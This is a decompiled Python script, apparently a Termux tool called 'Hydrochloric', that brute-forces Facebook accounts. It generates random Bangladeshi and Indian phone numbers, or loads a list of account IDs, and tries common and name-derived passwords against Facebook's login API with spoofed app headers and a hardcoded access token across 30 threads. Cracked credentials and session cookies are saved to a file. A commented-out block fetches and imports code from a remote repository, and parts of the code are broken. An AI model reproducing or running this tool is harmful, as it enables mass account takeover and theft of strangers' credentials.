""" Decompiled by Exotic Hridoy """

import subprocess
print('\n\t\033[38;5;208mDIVICE FUNCTION CHECKING...')

"""
def ___(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    out, err = process.communicate()
___('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/SERVER')
___('rm -rf SERVER;git clone https://github.com/MUHIB-143/SERVER && cd SERVER')
print('  \033[0m   SECURED BY : \033[5;32mMARUFUL HAQUE MUHIB \033[5;31m[\033[5;37mMUHIB-143\033[5;31m]')
___('mv SERVER /data/data/com.termux/files/usr/lib/python3.11/site-packages/SERVER')
try:
    from SERVER import muhib
    from SERVER import ms
except:
    exit('  FACING SOME ISSUES CHECK YOUR INTERNET ')
___('rm -rf SERVER')
___('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/SERVER')
"""

O = '\033[0m'
LJ = '\033[38;5;46m'
LA = '\033[38;5;10m'
LX = '\033[1;90m'
G = '\033[38;5;46m'

__M = '\033[5;44m\033[5;37m'
___M = '\033[5;41m\033[5;37m'
____M = '\033[5;42m\033[5;31m'
_____M = '\033[5;47m\033[5;30m'

_ = '\033[38;5;46m'
__ = '\033[38;5;47m'
___ = '\033[38;5;48m'
____ = '\033[38;5;49m'
_____ = '\033[38;5;50m'

O = '\033[0m\033[38;5;208m'
BLACK = '\033[5;30m'
RED = '\033[5;31m'
GREEN = '\033[5;32m'
YELLOW = '\033[5;33m'
BLU = '\033[5;34m'
PINK = '\033[5;35m'
CYAN = '\033[5;36m'
WHITE = '\033[5;37m'
ORANGE = '\033[38;5;208m'
LITE_GREEN = '\033[38;5;48m'

logo = '\n      ::   .:    .,-:::::    :::     \n     ,;;   ;;, ,;;;\'````\'    ;;;     Hydrochloric\n    ,[[[,,,[[[ [[[           [[[     \n    \"$$$\"\"\"$$$ $$$            $$\'     MUHIB-143\n     888   \"88o`88bo,__,o, o88oo,.__\n     MMM    YMM  \"YUMMMMMP\"\"\"\"\"YUMMM --> 1.0\n \033[38;5;208m!\033[5;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \033[38;5;208m!'

def linex():
    print(f' \033[38;5;208m!\033[5;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \033[38;5;208m!')

def clear():
    os.system('clear')
    print(logo)

try:
    import os
    import time
    import re
    import random
    import sys
    import uuid
    import string
    import platform
    import zlib
    import json
    from string import *
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError:
    exit()
nam = []

try:
    nam__ = open('._nm_.txt', 'r').read()
    nam.append(nam__)
except:
    os.system('clear')
    print(logo)
    nam__ = input(' \033[5;30m[\033[5;32m+\033[5;30m] \033[5;32mENTER YOUR NAME : \033[5;37m')
    open('._nm_.txt', 'a').write(nam__)
    nam.append(nam__)
nam = str(nam).replace('[\'', '').replace('\']', '')

def __key__():
    myid = str(os.getuid())
    myid = myid.upper()[::-1]
    n = re.findall('(\\d\\d)', myid)
    plat = platform.version()[1:][:1][1:].upper() + platform.release()[1:][::-1].upper() + platform.version()[:1]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    return myid + xp[15:]

def coki2(coki):
    datr = kuki.split('datr=')[1].split(';')[0]
    fr = kuki.split('fr=')[1].split(';')[0]
    c_user = kuki.split('c_user=')[1].split(';')[0]
    xs = kuki.split('xs=')[1].split(';')[0]
    cokiee = f'datr={datr};fr={fr};c_user={c_user};xs={xs}'
    return cokiee
nam = str(nam).replace('[\'', '').replace('\']', '')
from datetime import datetime
cc = datetime.now()
cy = cc.year
cm = cc.month
cd = cc.day
now_time = str(cy) + str(cm) + str(cd)

def apx():
    os.system('clear')
    __muhib__()

    """
    id = __key__()
    httpCaht = muhib.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7\xcf-\xcd\xc8L\xd2541\xd6K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd67\xb0\xd4O,(\xca/K\xcc)\xa9(\xd1\xcb(\xc9\xcd\xb1\xcf\xb55\x04\x00FP\x13\xba')).text
    if id in httpCaht:
        get_time = re.findall(str(id) + '=(.*)=' + str(nam), httpCaht)[0]
        expired_time = str(get_time)
        if now_time > expired_time:
            print(logo)
            print('\t\033[1;31m  YOUR KEY IS EXPIRED \n\t  \033[1;32mGET APROVAL AGAIN')
            exit()
        else:
            __muhib__()
    else:
        print(logo)
        print(f' \033[5;31m[{G}+\033[5;31m] {G}YOUR KEY : \033[5;37m{id}')
        print(f' \033[5;31m[{G}+\033[5;31m] {G}GET APROVAL FIRST ')
        linex()
        input(f' \033[5;31m[{G}+\033[5;31m] {G}PRESS ENTER  ')
        tks = f'ASSLAMUALAIKUM%20I%20!%20WANT%20TO%20BUY%20YOUR%20TOOL%20MY%20KEY%20:%20{id}'
        os.system('am start https://wa.me/+8801640396972?text=' + tks)
        time.sleep(10)
        exit()
    """

loop = 0
oks = []
pwx = []
cps = []
id = []

def __muhib__():
    clear()
    print(f'\t{RED}[{WHITE}1{RED}] {LITE_GREEN}RANDOM  {RED}[{WHITE}2{RED}] {LITE_GREEN}FILE   {__M}-->{O} ', end='')
    ________ = input()
    if ________ in ['2', '02', 'b', 'B']:
        print(f'\t{RED}[{WHITE}!{RED}] {LITE_GREEN}INPUT FILE PATH  {__M}-->{O} ', end='')
        file = input()
        try:
            fo = open(file, 'r').read().splitlines()
        except FileNotFoundError:
            print(f'\t{RED}[{WHITE}!{RED}] {LITE_GREEN}CAN\'T FOUND THE FILE ')
            time.sleep(1)
            __muhib__()
        print(f'\t{RED}[{WHITE}1{RED}] {LITE_GREEN}M1  {RED}[{WHITE}2{RED}] {LITE_GREEN}M2    {__M}-->{O} ', end='')
        mthd = input()
        plist = []
        try:
            ps_limit = int(input(f'\t{RED}[{WHITE}!{RED}] {LITE_GREEN}PASS LIMIT {__M}-->{O} '))
        except:
            ps_limit = 1
        linex()
        for i in range(ps_limit):
            plist.append(input(f'\t{RED}[{WHITE}!{RED}] {LITE_GREEN}PASS {i + 1} {__M}-->{O} '))
        with tred(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            if mthd in ['a', 'A', '1']:
                mthd = '1'
            if mthd in ['b', 'B', '2']:
                mthd = '2'
            clear()
            total_ids = str(len(fo))
            print(f'     {RED}[{WHITE}ID{RED}] {LITE_GREEN}' + total_ids, end='')
            print(f"  {RED}[{WHITE}P{RED}] {LITE_GREEN}{ps_limit} {RED}[{WHITE}M{RED}] {LITE_GREEN}{mthd} {RED}[{WHITE}T{RED}] {LITE_GREEN}{datetime.now().strftime('%I:%M.%p')}")
            linex()
            for user in fo:
                ids, names = user.split('|')
                passlist = plist
                if mthd in ['1']:
                    crack_submit.submit(_api2_, ids, names, passlist)
                else:
                    crack_submit.submit(_api3_, ids, names, passlist)
        print('\n')
        linex()
        print(f' {RED}[{WHITE}ID{RED}] {LITE_GREEN}OK ID\'S =\033[0m {str(len(oks))} ')
        linex()
        exit()
    if ________ in ['A', '01', 'a', '1']:
        __random__()
    if ________ in ['3', '03', 'c', 'C']:
        os.system('xdg-open https://www.facebook.com/its.muhib.7')
        __muhib__()
    if ________ in ['0', 'E', 'e']:
        clear()
        exit()

def _api2_(ids, names, passlist):
    global loop
    global oks
    try:
        sys.stdout.write(f'\r\033[0m   {ORANGE}!{GREEN}HCL-M1{ORANGE}! !\033[5;37m{loop}{ORANGE}! !\033[5;32m{len(oks)}{ORANGE}!')
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            uax = ' '.join(['[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)), '.0.0.' + str(random.randint(1111, 9999)), ';FBBV/' + str(random.randint(1111111, 9999999)), ';[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184967;FBDM/{density=3.0,width=1080,height=2113};FBLC/ru_RU;FBRV/0;FBCR/UA-KYIVSTAR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M315F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]'])
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            data = {'adid': adid, 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': '8b59ed89-4b88-4f69-a1ed-dfea59e76839', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'auth.login': 'authenticate', 'fb_api_req_friendly_name': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'fb_api_caller_class': '882a8490361da98702bf97a021ddc14d'}
            headers = {'User-Agent': uax, 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': '706'}
            url = 'https://graph.facebook.com/auth/login'
            po = muhib.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print(f'\r\r   \033[5;31m!{GREEN}HCL-💚\033[5;31m!{GREEN} {ids} {ORANGE}!{GREEN} {pas} \033[1;37m')
                coki = ';'.join([i['name'] + '=' + i['value'] for i in po['session_cookies']])
                open('/sdcard/HCL.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                oks.append(ids)
                break
            if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                open('/sdcard/X-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                break
        loop += 1
    except Exception as e:
        return None

def _api3_(ids, names, passlist):
    global loop
    global oks
    try:
        sys.stdout.write(f'\r\033[0m   {ORANGE}!{GREEN}HCL-M2{ORANGE}! !\033[5;37m{loop}{ORANGE}! !\033[5;32m{len(oks)}{ORANGE}!')
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            uax = ' '.join(['[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)), '.0.0.' + str(random.randint(1111, 9999)), ';FBBV/' + str(random.randint(1111111, 9999999)), ';[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076524;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/304151102;FBCR/ROSTELECOM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo ' + str(random.randint(111, 8888)), ';FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'])
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            data = {'adid': adid, 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': '8b59ed89-4b88-4f69-a1ed-dfea59e76839', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'auth.login': 'authenticate', 'fb_api_req_friendly_name': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'fb_api_caller_class': '882a8490361da98702bf97a021ddc14d'}
            headers = {'User-Agent': uax, 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': '706'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = muhib.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print(f'\r\r   \033[5;31m!{GREEN}HCL-💚\033[5;31m!{GREEN} {ids} {ORANGE}!{GREEN} {pas} \033[1;37m')
                coki = ';'.join([i['name'] + '=' + i['value'] for i in po['session_cookies']])
                open('/sdcard/HCL.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                oks.append(ids)
                break
            if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                open('/sdcard/X-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                break
        loop += 1
    except Exception as e:
        return None

def __random__():
    print(f'\t{RED}[{WHITE}1{RED}] {LITE_GREEN}BD  {RED}[{WHITE}2{RED}] {LITE_GREEN}IND   {__M}-->{O} ', end='')
    me = input()
    if me in ['f', 'F', '1', '01', 'A', 'a']:
        __BD__()
    if me in ['b', 'B', '2', '02', 'M', 'm']:
        __IND__()
    else:
        __random__()

def __BD__():
    user = []
    twf = []
    os.getuid
    os.geteuid
    print(f'\t{RED}[{WHITE}017{ORANGE}!{WHITE}019{ORANGE}!{WHITE}018{RED}] {LITE_GREEN}{__M}-->{O} ', end='')
    code = input()
    if not code:
        code = '017'
    print(f'\t{RED}[{WHITE}1000{ORANGE}!{WHITE}5000{RED}] {LITE_GREEN}{__M}-->{O} ', end='')
    try:
        limit = int(input())
    except:
        limit = 5000
    print(f'\t{RED}[{WHITE}1{RED}] {LITE_GREEN}M1  {RED}[{WHITE}2{RED}] {LITE_GREEN}M2{__M}-->{O} ', end='')
    mthd = input()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as muhib:
        clear()
        tl = str(len(user))
        if mthd in ['a', 'A', '1']:
            mthd = '1'
        if mthd in ['b', 'B', '2']:
            mthd = '2'
        if mthd in ['c', 'C', '3']:
            mthd = '3'
        total_ids = str(len(user))
        print(f'     {RED}[{WHITE}ID{RED}] {LITE_GREEN}' + total_ids, end='')
        print(f"  {RED}[{WHITE}C{RED}] {LITE_GREEN}{code} {RED}[{WHITE}M{RED}] {LITE_GREEN}{mthd} {RED}[{WHITE}T{RED}] {LITE_GREEN}{datetime.now().strftime('%I:%M.%p')}")
        linex()
        for love in user:
            pwx = [love[2:], love, code + love, code + love[:3], 'free fire', 'mababa', 'taniya', 'sumaiya', 'saiful', 'jannatul', 'Fatema', 'farjana', 'sabbir', 'humaira', 'alamin', 'mimmim', 'hridoy', 'fariya', 'shakil', '708090']
            ids = code + love
            if mthd in ['1', '01', 'A', 'a']:
                muhib.submit(__M1__, ids, pwx, tl)
            if mthd in ['b', 'B', '2', '02']:
                muhib.submit(__M2__, ids, pwx, tl)
            if mthd in ['c', 'C', '3', '03']:
                muhib.submit(__M3__, ids, pwx, tl)
    linex()
    print(f' \033[5;30m[{G}+\033[5;30m]{G} TOTAL OK ID  : \033[5;37m{str(len(oks))} ')
    linex()
    exit()

def __IND__():
    user = []
    twf = []
    os.getuid
    os.geteuid
    print(f'\t{RED}[{WHITE}620{ORANGE}!{WHITE}639{ORANGE}!{WHITE}723{RED}] {LITE_GREEN}{__M}-->{O} ', end='')
    code = input()
    if not code:
        code = '620'
    print(f'\t{RED}[{WHITE}1000{ORANGE}!{WHITE}5000{RED}] {LITE_GREEN}{__M}-->{O} ', end='')
    try:
        limit = int(input())
    except:
        limit = 5000
    print(f'\t{RED}[{WHITE}1{RED}] {LITE_GREEN}M1  {RED}[{WHITE}2{RED}] {LITE_GREEN}M2{__M}-->{O} ', end='')
    mthd = input()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as muhib:
        clear()
        tl = str(len(user))
        if mthd in ['a', 'A', '1']:
            mthd = '1'
        if mthd in ['b', 'B', '2']:
            mthd = '2'
        if mthd in ['c', 'C', '3']:
            mthd = '3'
        total_ids = str(len(user))
        print(f'     {RED}[{WHITE}ID{RED}] {LITE_GREEN}' + total_ids, end='')
        print(f"  {RED}[{WHITE}C{RED}] {LITE_GREEN}{code} {RED}[{WHITE}M{RED}] {LITE_GREEN}{mthd} {RED}[{WHITE}T{RED}] {LITE_GREEN}{datetime.now().strftime('%I:%M.%p')}")
        linex()
        for love in user:
            pwx = [love[2:], love, code + love, code + love[:3], '57273200', '59039200', '57575751', '5757571', '57575752']
            ids = '+91' + code + love
            if mthd in ['1']:
                muhib.submit(__M1__, ids, pwx, tl)
            else:
                muhib.submit(__M2__, ids, pwx, tl)
    print('\n')
    linex()
    print(f' {RED}[{WHITE}ID{RED}] {LITE_GREEN}OK ID\'S =\033[0m {str(len(oks))} ')
    linex()
    exit()

def coki2(kuki):
    datr = kuki.split('datr=')[1].split(';')[0]
    fr = kuki.split('fr=')[1].split(';')[0]
    c_user = kuki.split('c_user=')[1].split(';')[0]
    xs = kuki.split('xs=')[1].split(';')[0]
    cokiee = f'datr={datr};fr={fr};c_user={c_user};xs={xs}'
    return cokiee

def __M1__(ids, pwv, tl):
    global loop
    global oks
    sys.stdout.write(f'\r\033[0m   {ORANGE}!{GREEN}HCL-M1{ORANGE}! !\033[5;37m{loop}{ORANGE}! !\033[5;32m{len(oks)}{ORANGE}!')
    sys.stdout.flush()
    try:
        for pas in pwv:
            list_ABC123 = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
            A2 = str(''.join([random.choice(list_ABC123) for _ in range(4)]))
            model_ = 'SM-' + str(random.randint(100, 999))
            rand_name_ = random.choice(['Samsung', 'Kaios', 'Realme', 'Nokia', 'infinix'])
            width_ = random.randint(320, 1080)
            height_ = random.randint(480, 1920)
            _density = random.choice(['1.5', '1.0', '1.25', '1.75', '2.0', '2.5', '3.0'])
            application_version = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
            application_version_code = str(random.randint(0, 999999999))
            fbs = random.choice(['com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite'])
            android_version = str(random.randrange(4, 13))
            uax = ' '.join(['[FBAN/FB4A;FBAV/' + str(random.randint(9, 999)), '.0.0.' + str(random.randint(0, 9999)), ';FBBV/' + str(random.randint(0, 9999999)), ';[FBAN/FB4A;FBAV/143.0.0.28407;FBBV/954858918;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBMF/Sony;FBBD/Sony;FBDV/D2243;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]'])
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'GB', 'client_country_code': 'GT-7245', 'fb_api_req_friendly_name': 'Hydrochloric'}
            head = {'User-Agent': uax, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            po = muhib.post('https://b-graph.facebook.com/auth/login', data=data, headers=head, allow_redirects=False).json()
            if 'access_token' in po:
                coki = po['session_cookies']
                cok = {}
                for x in coki:
                    cok.update({x['name']: x['value']})
                kuki = ';'.join(['%s=%s' % (key, value) for key, value in cok.items()])
                uid = re.findall('c_user=(.*);xs', kuki)[0]
                kokii = coki2(kuki)
                print(f'\r\r   \033[5;31m!{GREEN}HCL-💚\033[5;31m!{GREEN} {uid} {ORANGE}!{GREEN} {pas} \033[1;37m')
                open('/sdcard/HCL.txt', 'a').write(uid + '|' + pas + '|' + kuki + '\n')
                oks.append(uid)
                break
            else:
                if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                    cps.append(ids)
                    break
        loop += 1
    except Exception as e:
        return None

def __M2__(ids, pwv, tl):
    global loop
    global oks
    sys.stdout.write(f'\r\033[0m   {ORANGE}!{GREEN}HCL-M1{ORANGE}! !\033[5;37m{loop}{ORANGE}! !\033[5;32m{len(oks)}{ORANGE}!')
    sys.stdout.flush()
    try:
        for pas in pwv:
            list_ABC123 = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
            A2 = str(''.join([random.choice(list_ABC123) for _ in range(4)]))
            model_ = 'SM-' + str(random.randint(100, 999))
            rand_name_ = random.choice(['Samsung', 'Kaios', 'Realme', 'Nokia', 'infinix'])
            width_ = random.randint(320, 1080)
            height_ = random.randint(480, 1920)
            _density = random.choice(['1.5', '1.0', '1.25', '1.75', '2.0', '2.5', '3.0'])
            application_version = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
            application_version_code = str(random.randint(0, 999999999))
            fbs = random.choice(['com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite'])
            android_version = str(random.randrange(4, 13))
            uax = ' '.join(['[FBAN/FB4A;FBAV/' + str(random.randint(9, 999)), '.0.0.' + str(random.randint(0, 9999)), ';FBBV/' + str(random.randint(0, 9999999)), ';[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906272;FBDM/{density=3.0,width=1080,height=2132};FBLC/ru_RU;FBRV/0;FBCR/Tele2;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX{random.randint(111,777)};FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'])
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'GB', 'client_country_code': 'GT-7245', 'fb_api_req_friendly_name': 'Hydrochloric'}
            head = {'User-Agent': uax, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            po = muhib.post('https://graph.facebook.com/auth/login', data=data, headers=head, allow_redirects=False).json()
            if 'access_token' in po:
                coki = po['session_cookies']
                cok = {}
                for x in coki:
                    cok.update({x['name']: x['value']})
                kuki = ';'.join(['%s=%s' % (key, value) for key, value in cok.items()])
                uid = re.findall('c_user=(.*);xs', kuki)[0]
                kokii = coki2(kuki)
                print(f'\r\r   \033[5;31m!{GREEN}HCL-💚\033[5;31m!{GREEN} {uid} {ORANGE}!{GREEN} {pas} \033[1;37m')
                open('/sdcard/HCL.txt', 'a').write(uid + '|' + pas + '|' + kuki + '\n')
                oks.append(uid)
                break
            else:
                if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                    open('/sdcard/MUHIB-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    cps.append(ids)
                    break
        loop += 1
    except Exception as e:
        return None

apx()
